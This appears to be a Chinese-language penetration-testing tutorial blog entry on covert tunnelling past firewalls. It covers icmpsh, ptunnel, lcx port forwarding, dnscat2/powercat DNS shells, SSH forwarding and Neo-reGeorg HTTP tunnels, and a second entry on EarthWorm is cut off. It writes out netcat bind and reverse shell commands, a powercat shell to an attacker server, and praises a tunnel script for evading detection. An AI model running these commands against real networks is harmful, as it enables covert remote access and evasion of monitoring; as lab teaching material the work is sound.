    <content type="html"><![CDATA[<h2 id="隐藏通信隧道"><a href="#隐藏通信隧道" class="headerlink" title="隐藏通信隧道"></a><strong>隐藏通信隧道</strong></h2><p><strong>1.1 隐藏通信隧道基础知识</strong></p><p>在实际的网络中，通常会通过各种边界设备、软&#x2F;硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。那么什么是隧道呢？这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。<br>常用的隧道列举如下：</p><ul><li>网络层：IPv6隧道、IMCP隧道、GRE隧道</li><li>传输层：TCP隧道、UDP隧道、常规端口转发</li><li>应用层：SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道</li></ul><p><strong>1.2 判断内网的连通性</strong><br>判断内网的连通性是指判断机器能否上外网等。要综合判断各种协议（TCP、HTTP、DNS、ICMP等)及端口通信的情况。常见的允许流量流出的端口有80、8080、443、53、110、123等。<br>常用的内网连通性判断方法如下</p><ul><li>ICMP协议</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping &lt;ip或 域名&gt;<br></code></pre></td></tr></table></figure><ul><li>TCP协议<br>netcat(简称nc)被誉为网络安全界的“瑞士军刀”，是一个短小精悍的工具，通过使用TCP或UDP协议的网络连接读写数据。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc  &lt;ip 端口&gt;<br>例如：<br>nc 192.168.1.1 80<br></code></pre></td></tr></table></figure><ul><li>HTTP协议</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl &lt;ip:端口&gt;<br></code></pre></td></tr></table></figure><p>如果远程主机开启了相应的端口，会输出相应的端口信息，如果远程主机没有开启相应的端口，则没有任何提示。</p><ul><li>DNS协议<br>在进行DNS连通性检测时，常用的命令为nslookup和dig</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nslookup 域名<br></code></pre></td></tr></table></figure><p>有一种情况是流量不能直接流出，需要在内网中设置代理服务器，常见于通过企业办公网段上网的场景。常见的判断方法如下。<br>1.查看网络连接，判断是否存在与其他机器8080(不绝对)等端口的连接(可以尝试运行 “ping -n 1 -a ip”)<br>2.查看内网中是否有主机名类似于”proxy”的机器<br>3.查看IE浏览器的直接代理<br>4.根据pac文件的路径(可能是本地路径，也可能是远程路径），将其下载下来并查看。<br>5.执行如下命令，利用curl工具确认</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl www.baidu.com   //不通<br>curl -x proxy-ip:port wwww.baidu.com    //通<br></code></pre></td></tr></table></figure><p><strong>2.1 网络层隧道技术</strong></p><ul><li>ICMP隧道<br>常用工具有：icmpsh、PingTunnel、icmptunnel、powershell icmp等<br>1.icmpsh<br>因为icmpsh工具要代替系统本身的Ping命令的应答程序，所有需要输入如下命令来关闭本地系统的icmp应答（如果需要恢复，设置为0），否则shell的运行不稳定</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysctl -w net.ipv4.icmp_echo_ignore_all=1<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210506221022965.png" alt="在这里插入图片描述"></p><p>配置环境服务端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum -y install epel-release<br>yum -y install python-pip<br>pip install --upgrade pip -i https://pypi.tuna.tsinghua.edu.cn/simple<br>pip install Impacket -i https://pypi.tuna.tsinghua.edu.cn/simple<br></code></pre></td></tr></table></figure><p>VPS运行：<br><img src="https://img-blog.csdnimg.cn/20210506223126341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接运行run.sh会报错。所以这里运行py的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python icmpsh_m.py &lt;vpsIP&gt; &lt;受控端IP&gt;<br></code></pre></td></tr></table></figure><p>目标主机运行：<br>将icmpsh.exe扔进目标主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\icmpsh.exe -t vps主机IP  <br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021050622384811.png" alt="在这里插入图片描述"><br>结果：<br><img src="https://img-blog.csdnimg.cn/2021050622390638.png" alt="在这里插入图片描述"><br>项目地址：<a href="https://github.com/inquisb/icmpsh">https://github.com/inquisb/icmpsh</a></p><ul><li>Pingtunnel<br>Pingtunnel也是一款常用的隧道工具。可跨平台使用。为避免隧道被滥用，可以为隧道设置密码</li></ul><p><img src="https://img-blog.csdnimg.cn/20210506234735805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>搭建：下载后解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> PingTunnel<br>make &amp;&amp; make install<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210506224727637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>跳板机运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ptunnel -x shuteer<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210506225941907.png" alt="在这里插入图片描述"><br>攻击机运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./ptunnel -p 192.168.112.37 -lp 1080 -da 10.10.10.30 -dp 3389 -x shuteer<br></code></pre></td></tr></table></figure><pre><code class="hljs">-lp：指定本地监听的端口-p 指定ICMP隧道另一端的IP-da：指定要转发的目标机器的IP-dp：指定要转发的目标机器的端口-x：指定连接密码</code></pre><p><img src="https://img-blog.csdnimg.cn/20210506234624153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>攻击机连接目标3389端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rdesktop -f  192.168.112.254:1080<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210506234915577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功连接到目标机</p><p>Pingtunnel工具在windows环境中也可以运行，只不过要在内网的Windows机器上安全wincap类库。</p><p><strong>2.2 传输层隧道技术</strong></p><ul><li>LCX<br>1.内网端口转发<br>lcx工具是一个基于Socket套接字实现的端口转发工具。有windows和Linux两个版本。windows为lcx.exe,liunx版本为portmap。</li></ul><p>在目标机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#将目标机上的3389端口的所有数据转发到公网vps的4444端口上</span><br>lcx.exe  -slave &lt;vps主机地址&gt; 4444  127.0.0.1  3389<br><br>portmap -m 3 -h1 127.0.0.1 -p1 33389 -h2 &lt;vps主机地址&gt; -p2 4444<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210507230736535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>在vps上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#将本机 4444端口上监听的所有数据转发到本机的5555端口上</span><br>lcx.exe  -listen 4444 5555<br><br>portmap -m 2 -p1 4444 -h2 &lt;vps主机地址&gt; -p2 5555<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210507230705555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>结果：<br><img src="https://img-blog.csdnimg.cn/20210507230846339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功访问到目标3389</p><p>2.本地端口映射<br>如果目标服务器由于防火墙的限制，部分端口(例如3389)的数据无法通过防火墙，可以将目标服务器相应的端口的数据穿透传到防火墙允许的其他端口(例如53）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lcx.exe -tran 53 &lt;目标主机IP地址&gt; 3389<br></code></pre></td></tr></table></figure><ul><li>netcat<br>常用参数:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">-l ： 使用监听模式，管理和控制传入的数据<br>-p : 设置本地主机使用的通信端口<br>-v ： 详细输出<br>-d ：后台模式<br>-e : 程序重定向<br></code></pre></td></tr></table></figure></li></ul><p>1.获取shell<br>（1）正向shell<br>在目标主机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 4444 -e /bin/sh     //linux<br>nc -lvp 4444 -e c:\windows\system32\cmd.exe      //windows<br></code></pre></td></tr></table></figure><p>在vps上执行：<br><img src="https://img-blog.csdnimg.cn/2021050811272211.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc &lt;目标主机IP&gt;  4444<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508112743205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>（2）.反向shell<br>在目标机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc &lt;vps主机IP&gt; 9999 -e /bin/sh      //linux<br>nc &lt;vps主机IP&gt; 9999 -e c:\windows\system32\cmd.exe      //windows<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508115105804.png" alt="在这里插入图片描述"></p><p>在vps上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 9999<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508115128840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210508115140193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2.nc代理<br>在这里插入图片描述</p><p>在kali中访问到10.10.10.12<br>在kali中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 3333<br></code></pre></td></tr></table></figure><p>在内网主机中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp  3333 -e c:\windows\system32\cmd.exe<br></code></pre></td></tr></table></figure><p>在web服务器中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -v 192.168.43.254 3333 -c <span class="hljs-string">&quot;nc -v 10.10.10.12 3333&quot;</span><br></code></pre></td></tr></table></figure><p>由于我环境问题就不演示了，在实战中也基本不会用到，了解就行了</p><p><strong>2.3应用层隧道技术</strong><br>常用的隧道协议有ssh、htto\https和dns。</p><ul><li>DNS协议:<br>首先，需要知道当前服务器是否允许内部的DNS解析外部的域名，也就是要测试DNS的连通性。<br>输入如下命令查看当前内部域名及IP地址：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#linux</span><br><span class="hljs-built_in">cat</span> /etc/resolv.conf | grep -v <span class="hljs-string">&#x27;#&#x27;</span><br><span class="hljs-comment">#windows</span><br>nslookup 内部的域名<br></code></pre></td></tr></table></figure><p>能够通过内部dns服务器解析外部域名，这意味着可以使用DNS隧道隐蔽通信。<br>（1）dnscat2<br>dnscat2工具的服务端是由ruby语言编写，而客户端是由c语言编写。现在也有powershell版。<br>它可以用自己的本身的客户端也可以用powercat作为客户端(powecat可以说是nc的powershell版)</p><p>使用dnscat2隧道的模式有两种，分别是直连模式和中继模式。</p><ul><li>直连模式：客户端直接指向IP地址的DNS服务器发起DNS解析请求。</li><li>中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器，与直连相比，中继模式的速度较慢。<br>服务端：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#启动</span><br>ruby./dnscat2.rb abc.com --secret=123456   <span class="hljs-comment">#方式1【常用】</span><br>ruby./dnscat2.rb --dns server=127.0.0.1,port=53,<span class="hljs-built_in">type</span>=TXT --secret=123456   <span class="hljs-comment">#方式2</span><br>ruby./dnscat2.rb abc.com --secret=123456 --security=open --no-cache   <span class="hljs-comment">#方式3</span><br>ruby ./dnscat2.rb  <span class="hljs-comment">#方式4</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#命令详解</span><br>-c : 加密通信<br>-e ：规定安全级别，<span class="hljs-string">&#x27;open&#x27;</span>表示服务端允许客户端不进行加密<br>--no-cache : 禁止缓存。<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508133139221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>客户端:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">dnscat --secret=123456 abc.com    <span class="hljs-comment">#对应 方式1、3</span><br>dnscat --dns server=&lt;your dnscat2 server ip&gt;,port=553,<span class="hljs-built_in">type</span>=TXT   <span class="hljs-comment">#对应 方式2，注意使用--dns选项时，port不可省，否则可能连不上</span><br>./dnscat --dns=server=192.168.43.254,port=53 <span class="hljs-comment">#对应方式4</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508132522708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>结果：<br>可以看见已经接收到一个session<br><img src="https://img-blog.csdnimg.cn/20210508133218338.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210508133323687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210508133349437.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210508133413114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在这里就可以执行命令操作了<br>（2）dnscat+powercat<br>客户端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Import-Module .\powercat.ps1<br>powercat -c 192.168.43.254 -p 53 -dns aaa.com -e cmd.exe<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508134519124.png" alt="在这里插入图片描述"><br>服务端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruby dnscat2.rb aaa.com -e open --no-cache<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508134537265.png" alt="在这里插入图片描述"><br>收到session</p><p>powercat 也可像nc哪像使用，使用方法都差不多。</p><p>详细学习请参考：<a href="https://blog.csdn.net/localhost01/article/details/86591685">https://blog.csdn.net/localhost01/article/details/86591685</a></p><ul><li>ssh协议：<br>创建ssh隧道的常用参数：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">-C ： 压缩传输，提高传输速度。<br>-f ： 将ssh传输转入后台执行，不占用当前的shell。<br>-N ：建立默认连接（建立了连接，但是看不到具体会话）。<br>-g ：允许远程主机连接本地用于转发的端口。<br>-L : 本地端口转发。<br>-R ： 远程端口转发。<br>-D ： 动态转发(socks代理）。<br>-P ：指定ssh端口。<br></code></pre></td></tr></table></figure><p>（1）本地转发<br><img src="https://img-blog.csdnimg.cn/20210508144037174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试目标：跳板机为跳板访问windows2008  3389端口<br>将内网windows主机3389端口映射到攻击机本地端口上。在访问这个本地端口就可以访问目标机的3389端口了<br>攻击执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -CfNg -L 1111:10.10.10.30:3389 root@192.168.43.37<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508144532744.png" alt="在这里插入图片描述"><br>这里要输入跳板机的登录密码<br>成功之后查看本地1111端口是否已经连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -tulnp | grep <span class="hljs-string">&quot;1111&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508144731680.png" alt="在这里插入图片描述"></p><p>在kali中执行 rdesktop 127.0.0.1:1111<br><img src="https://img-blog.csdnimg.cn/20210508144819413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>映射成功</p><p>ssh本地端口映射可以将本地(客户机)的某个端口转发到远端指定机器的指定端口；本地端口转发则是在本地(客户机)监听一个端口，所有访问这个端口的数据都会通过ssh隧道传输到远端的对应端口。</p><p>（2)远程转发</p><p><img src="https://img-blog.csdnimg.cn/20210508145642940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>web服务器中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -CfNg -R 3333:10.10.10.30:3389 root@192.168.43.254<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508145906561.png" alt="在这里插入图片描述"><br>kali中输入  redesktop 127.0.0.1:3333<br><img src="https://img-blog.csdnimg.cn/20210508150047952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功建立连接</p><p>本地端口转发是将远程主机某个端口的数据转发到本地机器的指定端口。远程端口转发则是在远程主机上监听一个端口，所有访问这个远程服务器指定端口的数据都会通过ssh隧道传输到本地的对应端口。</p><p>（3）动态转发<br><img src="https://img-blog.csdnimg.cn/20210508152101186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在kali中执行如下命令，建立一个动态的socks 4&#x2F;5代理通道</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -CfNg -D 7000 root@192.168.43.37<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508152228596.png" alt="在这里插入图片描述"><br>成功后配置proxychains</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/proxychains.conf<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508152329188.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210508153409376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功访问到内网主机</p><p>动态端口映射就是建立一个ssh加密的socks 4&#x2F;5代理通道。任何支持 socks 4&#x2F;5协议的程序都可以使用这个加密通道进行代理访问。</p><p><strong>2.4 HTTP&#x2F;HTTPS协议</strong><br>HTTP Service代理用于将所有的流量转发到内网。常见的代理工具有reGeorg,meterpreter,tunna等</p><ul><li>reGeorg<br>reGeorg支持ASPX,PHP,JSP等web脚本，并提供了一个Tomcat5版本。<br>这里使用Neo-reGeorg是大佬改版的reGeorg。<br>它的优势是做了加密处理，避免特征检测，生成的脚本也免杀！！</li></ul><p>实验环境：</p><p><img src="https://img-blog.csdnimg.cn/20210510145053711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>首先先生成加密脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python .\neoreg.py generate -k one<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210509000148936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将相应脚本文件上传到目标服务器上<br><img src="https://img-blog.csdnimg.cn/2021050900051045.png" alt="在这里插入图片描述"><br>攻击上运行进行隧道建立</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python neoreg.py -k one -u http://192.168.43.58/tunnel.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210510144725669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>成功建立的连接<br>配置本地代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/proxychains.conf<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210510145217247.png" alt="在这里插入图片描述"><br>测试与目标机连通<br><img src="https://img-blog.csdnimg.cn/20210510145321116.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>隧道隐藏</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网穿透</title>
    <link href="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    <url>/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透中拿到一台边缘机器后剩余内网机器不出网的情况很常见，这时我们就需要把内网机器流量转到边缘机器上再进行访问，内网流量转出来的方法很多，在下面就介绍几种常见的方法</p><p><strong>EarhWorm</strong></p><p>ew参数说明：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">-f : 设置连接主机地址。<br>-g : 设置连接端口。<br>-d : 设置反连主机地址。<br>-e : 设置反连端口。<br>-l : 为服务启动打开一个端口。<br>-s :  状态设置功能。<br></code></pre></td></tr></table></figure><p>6中链路状态 -s参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssocksd    rcsocks   rssocks<br>lcx_slave  lcx_tran  lcx_listen<br>其中 SOCKS5 服务的核心逻辑支持由 ssocksd 和 rssocks 提供，分别对应正向与反向socks代理。<br><br>lcx 链路状态用于打通测试主机同 socks 服务器之间的通路。<br><br>lcx_slave 控制管道：一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。<br><br>lcx_tran 转发管道：通过监听本地端口接收代理请求，并转交给代理提供主机。<br><br>lcx_listen 监听管道：通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。<br><br>通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。<br></code></pre></td></tr></table></figure><p>实验环境：<br><img src="https://img-blog.csdnimg.cn/20210511183651865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" 